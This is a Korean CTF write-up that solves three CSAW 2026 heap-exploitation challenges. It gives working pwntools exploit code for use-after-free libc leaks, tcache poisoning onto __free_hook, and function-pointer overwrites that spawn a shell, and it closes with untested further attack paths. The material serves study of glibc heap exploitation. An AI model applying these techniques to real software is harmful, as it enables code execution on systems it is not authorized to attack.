---
title: "CSAW CTF 2026 Quals — glibc 버전이 바뀌면 달라지는 것들"
date: 2026-10-14
tags: ["pwn", "heap", "uaf", "glibc", "tcache"]
categories: ["CSAW CTF 2026 Quals"]
summary: "Diamond Dogs, Hell's Bells, Saint Vespers. UAF로 libc를 누수하고 해제된 객체를 다시 할당해 함수 포인터를 덮는 세 문제를 한 번에 정리한다."
translationKey: "csaw-2026-heap"
---

## 개요

CSAW CTF 2026 Quals에서 푼 pwn 세 문제를 묶었다. 세 문제의 구조가 사실상 같다.

| | glibc | 버그 | 덮는 대상 |
|---|---|---|---|
| Diamond Dogs | 2.31 | 해제 후 포인터 미삭제 — 객체·버퍼 양쪽 | 객체 안의 함수 포인터 |
| Hell's Bells | 2.31 | 해제된 청크를 가리키는 편집 경로 | tcache fd → `__free_hook` |
| Saint Vespers | 2.35 | 해제된 객체의 필드를 다시 쓰는 경로 | 재할당된 객체의 `sing` |

보호 설정도 같은 방향으로 움직인다.

| | RELRO | PIE | Canary | 기타 |
|---|---|---|---|---|
| Diamond Dogs | Partial | No PIE | 없음 | |
| Hell's Bells | Full | PIE | 없음 | |
| Saint Vespers | Full | PIE | 있음 | SHSTK · IBT |

공통 골격은 셋 다 이렇다.

1. tcache를 넘는 크기의 청크를 해제해 unsorted bin으로 보낸다
2. 해제된 포인터를 그대로 읽어 `main_arena` 주소를 얻는다
3. 함수 포인터를 들고 있는 객체를 해제한 뒤, 같은 bin을 쓰는 다른 경로로 재할당해 그 포인터를 덮는다
4. 그 객체의 메서드를 호출한다

즉 누수와 제어 흐름 탈취가 **같은 버그의 두 가지 사용법**이다. 문제마다 바뀌는 것은 "어느 경로가 해제 후 포인터를 지우지 않는가"와 "어느 경로가 그 오프셋까지 쓸 수 있는가"뿐이다.

libc 버전이 갈리는 지점은 3단계다. Diamond Dogs와 Hell's Bells는 2.31이라 safe-linking(2.32)도 hook 제거(2.34)도 없다. Hell's Bells는 그 조건을 그대로 써서 tcache fd를 직접 덮고 `__free_hook`에 착지한다. Saint Vespers는 2.35라 그 길이 둘 다 막혀 있고, 대신 객체 안의 함수 포인터를 노린다 — freelist를 조작하지 않으므로 safe-linking이 무관해진다.

## 공통 기법: unsorted bin으로 libc 누수

tcache에 들어가는 청크는 fd에 tcache 구조체 주소가 들어가므로 libc 베이스를 바로 주지 않는다. 반면 tcache 용량(청크 크기 `0x410` 초과)을 넘는 청크를 해제하면 unsorted bin으로 가고, fd/bk에 `main_arena` 근처 주소가 들어간다.

glibc 2.31 기준 unsorted bin은 `main_arena + 96`이다. `__malloc_hook` 바로 다음이 `main_arena`이므로 심볼이 없는 libc에서도 오프셋을 잡을 수 있다.

```python
main_arena = libc.sym['__malloc_hook'] + 0x10
libc.address = leak - (main_arena + 96)
assert libc.address & 0xfff == 0
```

마지막 `assert`는 반드시 넣는다. libc 베이스는 페이지 정렬이므로 하위 12비트가 0이 아니면 오프셋 계산이나 누수 위치가 틀렸다는 뜻이다. 이 한 줄이 "값은 나왔는데 전부 쓰레기"인 상황을 즉시 걸러낸다.

2.34 이상에서는 `__malloc_hook` 심볼이 없으므로 이 계산식을 쓸 수 없다. 해당 libc에서 unsorted bin 오프셋을 직접 구해 상수로 박는다.

### 가드 청크

해제할 청크가 top chunk와 인접하면 unsorted bin으로 가지 않고 top에 흡수된다. 그러면 누수할 포인터가 아예 생기지 않는다.

그래서 큰 청크를 먼저 잡고, **그 뒤에 작은 청크를 하나 더 잡아 top과 분리한 다음** 큰 청크를 해제한다.

```python
file_note(p, 0, 0x500, b'A')
file_note(p, 1, 0x20, b'B')
shred(p, 0)
```

슬롯 1의 `0x20`짜리는 쓸 일이 없다. top 병합만 막는 용도다.

## Diamond Dogs

### 구성

```
guard-dog   amd64, No PIE, Partial RELRO, no canary, NX, not stripped
libc-2.31.so / ld-2.31.so
```

심볼이 남아 있어 전역 배열이 바로 보인다.

```
dogs      0x404120
notes     0x4040e0
note_sz   0x4040a0
woof      0x401256
```

관리 대상이 둘이다. `dogs`는 객체 포인터 배열이고 `notes`는 바이트 버퍼 포인터 배열이다. 각각 슬롯 8개(`0-7`)이고, 메뉴 핸들러는 전부 `main`에 인라인되어 있어 별도 함수가 없다.

dog 객체는 `malloc(0x20)`으로 잡히고 끝(`+0x18`)에 함수 포인터가 들어간다.

```c
pvVar3 = malloc(0x20);
*(code **)((long)pvVar3 + 0x18) = woof;
read_n(pvVar3, 0x18);
*(undefined1 *)((long)pvVar3 + 0x17) = 0;
*(void **)(dogs + uVar4 * 8) = pvVar3;
```

호출은 이렇게 한다.

```c
lVar1 = *(long *)(dogs + uVar4 * 8);
(**(code **)(lVar1 + 0x18))(lVar1);
```

### 버그

해제 경로가 둘인데 **둘 다 포인터를 지우지 않는다.**

```c
free(*(void **)(dogs + uVar4 * 8));
free(*(void **)(notes + uVar4 * 8));
```

note 쪽 dangling pointer는 누수에 쓰고, dog 쪽 dangling pointer는 제어 흐름 탈취에 쓴다.

### 쓰기 길이의 비대칭

이 문제의 본질은 두 할당 경로의 쓰기 길이가 다르다는 것이다.

`adopt`은 `0x20`을 할당하지만 `read_n`으로 `0x18`바이트만 읽고 `+0x17`을 0으로 덮는다. 즉 `+0x18`의 함수 포인터에는 **의도적으로 닿을 수 없게** 되어 있다.

`file_note`는 다르다. 요청한 크기만큼 전부 읽는다.

```c
if (*(long *)(notes + uVar4 * 8) == 0) {
    __size = read_long();
    if (__size - 1 < 0x1000) {
        pvVar3 = malloc(__size);
        read_n(pvVar3, __size);
        ...
    }
}
```

슬롯 점유 검사는 있다. 다만 `shred`가 포인터를 지우지 않으므로 해제된 슬롯은 점유 상태로 남고, 새 note는 빈 슬롯 번호를 써야 한다.

`malloc(0x20)`과 `malloc(0x20)`은 같은 청크 크기 `0x30`이므로 같은 tcache bin을 쓴다. 따라서 **dog을 해제한 뒤 같은 크기의 note를 할당하면 그 dog 청크를 note로 받게 되고, 이번에는 `+0x18`까지 쓸 수 있다.**

보호 장치가 한쪽 경로에만 붙어 있는 것이 버그다.

### 누수

note 읽기 경로가 `puts`가 아니라 `write` 시스템콜이다.

```c
write(1, *(void **)(notes + uVar4 * 8), *(size_t *)(note_sz + uVar4 * 8));
```

NULL에서 멈추지 않고 저장된 길이만큼 그대로 뱉는다. 해제된 청크의 fd가 포인터 그대로 나온다.

크기 제한은 `__size - 1 < 0x1000`이므로 `0x500`까지 쓸 수 있다. 청크 크기는 `0x510`이 되어 tcache 상한 `0x410`을 넘고, 따라서 unsorted bin으로 간다.

```python
file_note(p, 0, 0x500, b'A')
file_note(p, 1, 0x20, b'B')
shred(p, 0)

leak = u64(read_note(p, 0, 0x500)[:8])
main_arena = libc.sym['__malloc_hook'] + 0x10
libc.address = leak - (main_arena + 96)
assert libc.address & 0xfff == 0, 'leak offset wrong'
```

### 제어 흐름 탈취

dog을 하나 만들고, 이름 자리에 `/bin/sh`를 넣는다. 호출 규약상 메서드는 자기 객체 포인터를 첫 인자로 받으므로, 객체 시작 주소가 곧 인자다.

```python
adopt(p, 0, b'/bin/sh\x00')
release(p, 0)
file_note(p, 2, 0x20,
          b'/bin/sh\x00' + b'\x00' * 0x10 + p64(libc.sym.system))
command(p, 0)
```

`release`로 들어간 청크를 `file_note`가 다시 받아, `+0x18`의 함수 포인터를 `system`으로 덮는다. `command`가 그것을 `(*fp)(obj)` 형태로 호출하므로 `system("/bin/sh")`가 된다.

one_gadget이나 ROP가 필요 없다. 호출 규약이 인자를 대신 채워 준다.

### 전체 흐름

```
file_note(0, 0x500)   큰 청크 확보
file_note(1, 0x20)    가드 청크
shred(0)              unsorted bin 진입
read_note(0)          main_arena 누수
adopt(0, "/bin/sh")   객체 생성
release(0)            tcache 0x30 bin 진입
file_note(2, 0x20)    같은 청크 재할당, +0x18 덮기
command(0)            system("/bin/sh")
```

### 짚어둘 점

- 누수와 탈취가 서로 다른 bin을 쓴다. `0x510`은 unsorted bin, `0x30`은 tcache다.
- 가드 청크를 빼면 `0x510` 청크가 top에 흡수되어 누수 단계에서 아무것도 나오지 않는다.
- `adopt`이 `+0x17`을 0으로 덮는 것은 함수 포인터를 보호하는 코드다. 그 보호가 한쪽 할당 경로에만 붙어 있다는 점이 이 문제의 전부다.

## Hell's Bells

### 구성

```
thermite-charge   amd64, PIE, Full RELRO, no canary, NX, not stripped
libc-2.31.so / ld-2.31.so
```

Diamond Dogs와 메뉴 구조가 거의 같다. 슬롯 16개, 전역 배열 둘.

```
charges   0x40e0
sizes     0x4060
```

다른 점은 객체가 없다는 것이다. 여기서 다루는 건 순수 바이트 버퍼뿐이고, 따라서 덮을 함수 포인터도 없다. `read_long`, `read_n`, 크기 제한 `__size - 1 < 0x1000`, `write`로 그대로 뱉는 `inspect`까지 전부 Diamond Dogs와 동일하다.

PIE와 Full RELRO가 켜져 있지만 영향이 없다. 아래 익스플로잇은 바이너리 주소도 GOT도 쓰지 않는다.

### 버그

`plant`은 슬롯이 비어 있는지(`== 0`) 확인한다. 하지만 `defuse`가 포인터를 지우지 않으므로, 해제된 슬롯은 여전히 "점유 상태"로 남는다.

```c
free(*(void **)(charges + uVar2 * 8));
puts("charge defused");
```

그리고 `rewire`는 그 슬롯에 대고 다시 쓴다.

```c
if ((uVar2 < 0x10) && (*(long *)(charges + uVar2 * 8) != 0)) {
    read_n(*(undefined8 *)(charges + uVar2 * 8),
           *(undefined8 *)(sizes + uVar2 * 8));
}
```

해제 여부를 검사하지 않고, 길이는 원래 할당 크기를 그대로 쓴다. **해제된 청크의 선두를 원하는 값으로 덮을 수 있다**는 뜻이고, 그 자리가 tcache의 `next` 포인터다.

Diamond Dogs가 "같은 bin을 쓰는 다른 경로로 재할당"이었다면, 여기는 재할당조차 필요 없이 freelist를 직접 편집한다.

### tcache 포이즈닝

glibc 2.31에는 safe-linking이 없다. fd에 넣은 값이 그대로 다음 청크 주소로 쓰인다. 그리고 `__free_hook`이 아직 존재한다.

누수는 공통 기법 그대로다.

```python
plant(p, 0, 0x500, b'A')
plant(p, 1, 0x20, b'B')
defuse(p, 0)

leak = u64(inspect(p, 0, 0x500)[:8])
main_arena = libc.sym['__malloc_hook'] + 0x10
libc.address = leak - (main_arena + 96)
assert libc.address & 0xfff == 0, 'libc offset wrong'
```

이후가 본편이다.

```python
plant(p, 2, 0x20, b'C')
plant(p, 3, 0x20, b'D')
defuse(p, 2)
defuse(p, 3)

rewire(p, 3, 0x20, p64(libc.sym['__free_hook']))

plant(p, 4, 0x20, b'/bin/sh\x00')
plant(p, 5, 0x20, p64(libc.sym.system))

menu(p, 2)
p.sendlineafter(b'slot: ', b'4')
```

tcache `0x30` bin의 상태 변화.

```
defuse(2)             head -> c2
defuse(3)             head -> c3 -> c2
rewire(3, &free_hook) head -> c3 -> __free_hook
plant(4)              c3 반환,  head -> __free_hook
plant(5)              __free_hook 반환
```

슬롯 4가 받은 청크가 c3이고 그 내용이 `/bin/sh`, 슬롯 5가 받은 주소가 `__free_hook`이고 그 내용이 `system`이다. 마지막으로 슬롯 4를 `defuse`하면 `free(c3)`이 되고, `__free_hook`이 인자로 c3를 받아 호출되므로 `system("/bin/sh")`가 된다.

### 청크를 두 개 해제하는 이유

해제된 청크 하나로도 fd 덮기는 된다. 하지만 두 번째 할당이 포이즈닝된 주소로 가지 않는다.

tcache는 `counts[idx]`를 따로 관리하고, `tcache_get`은 `counts > 0`일 때만 호출된다. 하나만 해제하면 counts가 1이고, 첫 할당에서 0이 되면서 두 번째 할당은 tcache를 거치지 않는다. fd를 아무리 잘 덮어도 그 링크를 따라갈 기회가 없다.

둘을 해제하면 counts가 2다. 첫 할당이 c3을 꺼내며 1, 두 번째 할당이 아직 `> 0`이므로 덮어둔 `entries[idx]`를 그대로 반환한다. 그래서 `0x20` 청크 두 개가 최소 조건이다.

### 짚어둘 점

- 두 문제의 차이는 "쓰기 가능한 dangling pointer를 어디서 얻는가" 하나다. Diamond Dogs는 해제된 객체를 다른 경로로 재할당해 얻고, Hell's Bells는 편집 경로가 해제 상태를 검사하지 않아 바로 얻는다. 뒤쪽이 더 강한 원시 기능이라 freelist를 직접 조작할 수 있다.
- `plant`의 점유 검사가 `!= 0`인데 `defuse`가 포인터를 남기므로 한 슬롯을 해제-재사용으로 돌릴 수 없다. 슬롯 번호를 매번 새로 쓴다.
- `__free_hook`을 쓰는 건 glibc 2.31이라서 가능하다. 2.34 이상이면 이 착지점이 없다. 같은 구조의 문제가 Saint Vespers다.

## Saint Vespers and the Copper Choir

### 구성

이 문제만 원본 C 코드가 같이 배포됐다. 디컴파일이 필요 없는 대신, 읽을 양이 늘어난다.

```
vespers     amd64, PIE, Full RELRO, canary, NX, SHSTK, IBT
vespers.c
ld-2.35.so / libc.so_3.6   (Ubuntu GLIBC 2.35-0ubuntu3.14)
```

보호가 가장 두껍다. 그런데 최종적으로 노리는 것이 **정상 함수의 진입점**이라서 영향이 없다. `sing` 필드를 `system`으로 바꿔 `choir[i]->sing(choir[i])`로 호출하므로 간접 분기 대상이 유효한 함수 시작 주소이고, 스택을 조작하지 않으므로 canary와 shadow stack도 건드리지 않는다. CET가 막는 것은 ROP처럼 함수 중간으로 뛰는 쪽이다.

관리 대상은 구조체 하나다.

```c
typedef struct chorister {
    char   name[NAME_SIZE];        /* 0x38 */
    void (*sing)(struct chorister *self);
    char  *transcript;
    size_t transcript_len;
    int    active;
} chorister_t;
```

`sizeof(chorister_t)`는 `0x58`이고 청크 크기는 `0x60`이다. 함수 포인터는 화이트리스트에서만 고르게 되어 있다.

```c
static void (*const sing_table[3])(chorister_t *) = {
    sing_gregorian, sing_echo, sing_harmony,
};
...
if (style < 0 || style > 2) style = 0;
c->sing = sing_table[style];
```

인덱스 검증도 깔끔하다.

```c
static int valid_idx(long idx) {
    return idx >= 0 && idx < MAX_CHOIR && choir[idx] != NULL;
}
```

`main`에서 `setvbuf`에 정적 버퍼를 넘기는 것도 의도적이다. stdio가 힙을 건드리지 않으므로 청크 배치가 내가 호출한 연산 그대로 결정된다. 소스 주석에도 그렇게 적혀 있다.

### 버그

`op_retire`가 해제 후에 필드를 쓴다.

```c
if (c->transcript) free(c->transcript);
free(c);
c->active = 0;
```

세 줄에 문제가 다 있다.

- `choir[idx]`를 NULL로 만들지 않는다. 해제된 객체가 계속 유효한 슬롯으로 남는다.
- `c->transcript`를 NULL로 만들지 않는다. 해제된 transcript를 가리키는 포인터가 살아 있다.
- `free(c)` 다음의 `c->active = 0`은 해제된 메모리에 대한 쓰기다.

마지막 줄의 오프셋이 `+0x50`이라 tcache가 쓰는 `next`(`+0x00`)와 `key`(`+0x08`)를 건드리지 않는다. 그래서 freelist가 깨지지 않고, 해제된 객체가 조용히 살아 있다.

`op_restore`는 그 쓰기를 되돌려 준다.

```c
if (c->active) { puts("..."); return; }
c->active = 1;
```

`retire`로 0이 된 플래그를 `restore`가 1로 되돌리므로, 해제된 객체가 `active` 검사를 요구하는 모든 경로(`inscribe` / `recite` / `rename` / `perform`)를 다시 통과한다.

`free(c)` 바로 다음 줄의 `c->active = 0`은 소스에서는 한눈에 보인다. 디컴파일 결과에서는 전역 배열에 대한 오프셋 대입 한 줄일 뿐이다.

### 누수

transcript 길이를 `0x500`으로 잡으면 청크가 `0x510`이 되어 tcache 상한을 넘는다. 두 번째 `recruit`이 가드 역할이다. 앞 두 문제의 `0x20` 가드 청크와 같은 수이고, 여기서는 객체와 transcript가 함께 쌓이므로 top 병합이 더 확실히 막힌다.

```python
recruit(p, b'AAAA', 0, 0x500, b'A')
recruit(p, b'BBBB', 0, 0x20,  b'B')

retire(p, 0)
restore(p, 0)

leak = u64(recite(p, 0, 0x500)[:8])

UNSORTED_OFF = 0x21ace0
libc.address = leak - UNSORTED_OFF
assert libc.address & 0xfff == 0, 'libc offset wrong'
```

`retire(0)`이 transcript와 객체를 모두 해제하고, `restore(0)`이 `active`를 되살린다. `op_recite`는 `c->transcript`와 `c->transcript_len`을 그대로 쓰므로, 해제된 `0x510` 청크의 내용이 `write`로 나온다.

```c
(void)write(1, c->transcript, c->transcript_len);
```

`__malloc_hook`이 없으므로 오프셋은 libc에서 직접 구해 상수로 넣었다.

### 같은 size class

여기가 이 문제의 핵심이다. transcript 길이는 `1`에서 `0x1000` 사이에서 **내가 정한다.** 그리고 `sizeof(chorister_t)`는 `0x58`이다.

즉 `0x58` 길이의 transcript를 요청하면 객체와 같은 `0x60` bin에서 할당된다. `op_recruit`의 할당 순서를 보면 결과가 나온다.

```c
chorister_t *c = malloc(sizeof(chorister_t));   /* 0x60 bin */
...
char *transcript = malloc((size_t)len);          /* len=0x58 이면 같은 0x60 bin */
...
read_exact(transcript, (size_t)len);
```

한 번의 `recruit`이 `0x60` bin에서 두 번 할당한다. 앞의 것은 새 객체가 되고, 뒤의 것은 **내가 내용을 전부 쓰는 버퍼**가 된다. 해제된 객체 두 개를 bin에 넣어 두면, 뒤쪽 할당이 아직 슬롯에 매달려 있는 다른 객체를 집어온다.

```python
retire(p, 1)

payload  = b'/bin/sh\x00'.ljust(0x38, b'\x00')
payload += p64(libc.sym.system)
payload += p64(0)
payload += p64(0)
payload += p32(1)
payload  = payload.ljust(0x58, b'\x00')

recruit(p, b'CCCC', 0, 0x58, payload)
menu(p, 8)
```

`0x60` bin 상태와 할당 결과.

```
retire(1)        free(t1)=0x30 bin,  free(obj1) -> head -> obj1 -> obj0
recruit 내부 1   malloc(0x58) -> obj1  = 슬롯 2의 새 객체
recruit 내부 2   malloc(0x58) -> obj0  = transcript 버퍼
read_exact       obj0 전체를 payload로 덮음
```

`obj0`은 여전히 `choir[0]`이고 `restore(0)` 덕에 `active`다. payload가 그 구조체를 그대로 재구성한다.

```
name            "/bin/sh\0"
sing            system
transcript      0
transcript_len  0
active          1
```

`op_perform`이 호출 규약대로 자기 자신을 인자로 넘긴다.

```c
if (choir[i] && choir[i]->active)
    choir[i]->sing(choir[i]);
```

구조체 시작 주소가 곧 `name`의 주소이므로 `system("/bin/sh")`가 된다.

### 짚어둘 점

- 화이트리스트 함수 포인터는 **생성 시점**에만 강제된다. `sing_table` 범위 검사는 `op_recruit` 안에 있고, 그 뒤로 `sing` 필드에 닿는 경로는 검사를 거치지 않는다.
- `NAME_SIZE 0x38`과 transcript 범위 `1..0x1000`이 `0x58`에서 겹친다. 사용자가 크기를 정하는 버퍼와 고정 크기 구조체가 같은 size class를 공유하는 구조다.
- safe-linking을 한 번도 건드리지 않는다. fd를 덮는 대신 정상 할당 순서로 원하는 청크를 받아내기 때문이다.
- `op_roster`는 `active` 여부와 무관하게 `name` 전체 `0x38`바이트를 출력한다. 해제된 객체에 쓰면 mangle된 tcache `next`가 나오지만 이 풀이에서는 필요하지 않았다.

## 지금 다시 보면

글을 쓰면서 다시 읽다 보니 당시에 쓰지 않았던 경로가 눈에 들어온다. 아래는 풀이 당시 고려하지 않았던 것들이고, 실제로 돌려서 확인한 것이 아니라 코드를 다시 읽고 정리한 수준이다.

### Diamond Dogs — tcache 포이즈닝이 가능했다

`file_note`로 해제된 dog 청크를 받으면 오프셋 0부터 쓸 수 있고, 그 자리가 tcache `next`다. 실제 풀이는 거기에 `/bin/sh`를 썼지만, 같은 쓰기로 주소를 넣으면 Hell's Bells에서 쓴 포이즈닝이 된다. 2.31이라 safe-linking도 없다.

여기에 No PIE가 겹친다. 전역 배열 주소가 고정이다.

```
notes     0x4040e0
note_sz   0x4040a0
```

`note_sz`에 청크를 띄워 임의의 길이를 써넣으면 `read_note`의 출력 길이가 그만큼 늘어난다. `notes`까지 덮으면 읽을 주소와 길이를 모두 통제하게 되므로 임의 읽기가 된다. 포이즈닝으로 받은 청크에 `file_note`로 쓰면 임의 쓰기도 된다.

단, 점유 검사 때문에 note 슬롯은 매번 새 번호를 써야 하고 슬롯이 8개뿐이다. 두 전역 배열을 다 덮으려면 할당 횟수를 세어 두고 시작해야 한다.

### Hell's Bells — 큰 청크 쪽을 읽기만 했다

`rewire`는 해제 상태를 검사하지 않으므로 `0x500` 청크에도 쓸 수 있다. 그런데 풀이는 그 청크를 `inspect`로 읽기만 했다.

unsorted bin에 있는 청크의 `fd`/`bk`를 쓸 수 있다는 뜻이고, unsorted bin attack이나 largebin attack의 전제가 그대로 성립한다. tcache 쪽이 더 간단해서 그쪽만 썼다.

그리고 `rewire`는 `next`(`+0x00`)와 함께 `key`(`+0x08`)도 덮는다. `key`를 지우면 2.31의 tcache double-free 검사를 통과시킬 수 있다. 쓸 일이 없었지만 가능했다.

### Saint Vespers — 임의 읽기/쓰기를 지나쳤다

가장 아쉬운 지점이다. 최종 payload는 구조체 전체를 재구성하는데, 거기에는 `transcript`와 `transcript_len`도 들어 있다.

```python
payload += p64(0)   # transcript
payload += p64(0)   # transcript_len
```

둘을 0으로 채웠다. 그런데 `op_recite`와 `op_inscribe`가 바로 이 두 필드를 쓴다.

```c
(void)write(1, c->transcript, c->transcript_len);   /* recite */
read_exact(c->transcript, c->transcript_len);        /* inscribe */
```

`(임의 주소, 길이)`를 넣었으면 그 슬롯이 임의 읽기 겸 임의 쓰기 핸들이 됐다. 한 번 쓰고 끝이 아니라 슬롯이 살아 있는 동안 반복해서 쓸 수 있다. 같은 한 번의 쓰기로 `sing` 하나를 덮는 것보다 훨씬 강하고 비용도 같았다.

`solve.py`에 `rename()`과 `roster()` 헬퍼를 만들어 두고 한 번도 호출하지 않았는데, 그 둘이 남은 경로였다.

- `op_roster`는 `active`와 무관하게 `name` 전체 `0x38`바이트를 출력한다. 해제된 객체에 대고 쓰면 mangle된 tcache `next`가 나오고, 2.35의 mangling이 `(청크주소 >> 12) ^ 포인터`이므로 거기서 힙 베이스를 복원할 수 있다.
- `op_rename`은 `name` 오프셋 0에 `0x37`바이트를 쓴다. 해제된 객체에 대고 쓰면 `next`와 `key`를 모두 덮는다.

둘을 합치면 2.35에서도 tcache 포이즈닝이 성립한다. 힙 베이스를 `roster`로 얻어 mangling을 계산하고, `rename`으로 `next`를 덮는 식이다. safe-linking이 막는 것은 "주소를 모르는 상태에서의 포이즈닝"이고, 누수 경로가 같이 열려 있으면 막히지 않는다.

## 정리

세 문제의 UAF 획득 방식과 착지점.

| | dangling pointer를 얻는 법 | 착지점 |
|---|---|---|
| Diamond Dogs | 해제된 객체를 다른 할당 경로로 재할당 | 객체의 함수 포인터 |
| Hell's Bells | 편집 경로가 해제 상태를 검사하지 않음 | tcache fd → `__free_hook` |
| Saint Vespers | 해제 후 필드 대입이 슬롯을 살려 둠 | 같은 size class로 받은 객체의 함수 포인터 |

누수는 셋이 동일하다. tcache 상한(`0x410`)을 넘는 크기로 해제해 unsorted bin에 넣고, 지워지지 않은 포인터로 읽는다.

갈리는 것은 libc 버전이다.

| | 2.31 | 2.35 |
|---|---|---|
| tcache fd mangling | 없음 | `(청크주소 >> 12) ^ 포인터` |
| `__malloc_hook` / `__free_hook` | 있음 | 제거 |
| unsorted bin 오프셋 계산 | `__malloc_hook + 0x10 + 96` | 심볼 없음, 직접 측정 |
| 최단 경로 | freelist 포이즈닝 → hook | 애플리케이션 객체의 함수 포인터 |

2.31에서는 hook이 있으니 freelist를 한 번 조작하는 것으로 끝난다. 2.35에서는 그 착지점이 사라져서 공격 대상이 libc에서 프로그램 자신의 객체로 옮겨간다. 그리고 그 경로는 freelist를 건드리지 않으므로 safe-linking이 걸리지 않는다.

---

전체 스크립트: [ctf-writeups/2026-csaw-quals](https://github.com/wjddml/ctf-writeups/tree/main/2026-csaw-quals)
